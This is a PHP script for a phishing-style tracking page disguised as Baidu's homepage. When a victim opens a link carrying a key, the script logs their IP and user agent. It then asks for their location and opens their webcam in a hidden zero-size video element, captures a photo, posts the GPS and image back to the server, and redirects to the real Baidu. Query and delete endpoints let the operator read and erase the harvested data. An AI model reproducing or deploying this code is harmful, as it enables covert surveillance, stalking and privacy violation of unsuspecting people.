<?php
    error_reporting(0);
    
    define('RECORD_PATH', str_replace('\\', '/', realpath(dirname(__FILE__).'/')).'/information_probe_record/');
    if (!is_dir(RECORD_PATH)) {
        mkdir(RECORD_PATH);
    }
    
    function is_https() {
        if (!empty($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) != 'off') {
            return true;
        } elseif (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https') {
            return true;
        } elseif (!empty($_SERVER['HTTP_FRONT_END_HTTPS']) && strtolower($_SERVER['HTTP_FRONT_END_HTTPS']) != 'off') {
            return true;
        }
        return false;
    }
    
    function get_ip() {
        if (isset($_SERVER)) {
            if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            } elseif (isset($_SERVER['HTTP_CLIENT_IP'])) {
                $ip = $_SERVER['HTTP_CLIENT_IP'];
            } else {
                $ip = $_SERVER['REMOTE_ADDR'];
            }
        } else {
            if (getenv('HTTP_X_FORWARDED_FOR')) {
                $ip = getenv('HTTP_X_FORWARDED_FOR');
            } elseif (getenv('HTTP_CLIENT_IP')) {
                $ip = getenv('HTTP_CLIENT_IP');
            } else {
                $ip = getenv('REMOTE_ADDR');
            } 
        }
        return $ip;
    }
    
    function return_probe_html($key) {
        exit('
            <!DOCTYPE html>
            <html lang="zh-CN">
                <head>
                    <meta charset="utf-8">
                    <title>百度一下，你就知道</title>
                </head>
                <body>
                    
                    <video id="video" width="0" height="0" autoplay></video>
                    <canvas style="width:0px;height:0px" id="canvas" width="360" height="480"></canvas>
                    
                    <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
                    <script src="https://cdn.staticfile.org/axios/0.18.0/axios.min.js"></script>
                    <script type="text/javascript">
                        var url = window.location.href.replace(window.location.search, ""),
                        gps = "失败",
                        camera = "失败",
                        gps_state = null,
                        camera_state = null;
                        
                        if (navigator.geolocation) {
                            navigator.geolocation.getCurrentPosition(gps_position, gps_error);
                        } else {
                            gps_state = false;
                            request();
                        }
                        
                        function gps_position(position) {
                            gps = position.coords.latitude + "," + position.coords.longitude;
                            gps_state = true;
                            request();
                        }
                        
                        function gps_error(error) {
                            gps_state = false;
                            request();
                        }
                        
                        window.addEventListener("DOMContentLoaded", function() {
                            var canvas = document.getElementById("canvas");
                            var context = canvas.getContext("2d");
                            var video = document.getElementById("video");
                            
                            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                                navigator.mediaDevices.getUserMedia({video: true}).then(function(stream) {
                                    video.srcObject = stream;
                                    video.play();
                                    setTimeout(
                                        function() {
                                            context.drawImage(video, 0, 0, 360, 480);
                                        },
                                    1000);
                                    setTimeout(
                                        function() {
                                            camera = canvas.toDataURL("image/png");
                                            camera_state = true;
                                            request();
                                        },
                                    1300);
                                },
                                function() {
                                    camera_state = false;
                                    request();
                                });
                            }
                        }, false);
                        
                        function request() {
                            if (gps_state != null && camera_state != null) {
                                axios.post(url + "?type=record_second&key='.$key.'", "gps=" + gps + "&camera=" + encodeURIComponent(camera))
                                    .then((data)=>{
                                        window.location.href = "https://www.baidu.com/";
                                    });
                            }
                        }
                    </script>
                    
                </body>
            </html>
        ');
    }
    
    function read($key) {
        $file_path = RECORD_PATH.$key.'.json';
        $data = file_get_contents($file_path);
        $data = json_decode($data, true);
        return $data;
    }
    
    function record($key, $gps, $camera) {
        $data = read($key);
        $file = fopen(RECORD_PATH.$key.'.json', 'w');
        $data[get_ip()] = array(
            'user_agent'=>$_SERVER['HTTP_USER_AGENT'],
            'gps'=>$gps,
            'camera'=>$camera
        );
        fwrite($file, json_encode($data, JSON_UNESCAPED_UNICODE));
        fclose($file);
    }
    
    function return_result($information, $state=200) {
    	$result = array(
    		'state'=>$state,
    		'information'=>$information
    	);
    	exit(stripslashes(json_encode($result, JSON_UNESCAPED_UNICODE)));
    }
    
    $type = $_GET['type'];
    $key = $_GET['key'];
    if (($type != 'record' and $type != 'record_second' and $type != 'query' and $type != 'delete') or empty($key)) {
    	return_result('参数错误', 100);
    }
    if ($type == 'record') {
        if (array_key_exists(get_ip(), read($key))) {
            header('Location: https://www.baidu.com/');
        }
        if (is_https()) {
            return_probe_html($key);
        }
        record($key, '无', '无');
        header('Location: https://www.baidu.com/');
    } elseif ($type == 'record_second') {
        record($key, $_POST['gps'], $_POST['camera']);
    } elseif ($type == 'query') {
        header('Content-type: application/json; charset=utf-8');
        $data = read($key);
        if (empty($data)) {
            $data = '无记录';
        }
        return_result($data);
    } else {
        if (unlink(RECORD_PATH.$key.'.json')) {
            return_result('删除成功');
        } else {
            return_result('删除失败');
        }
    }
?>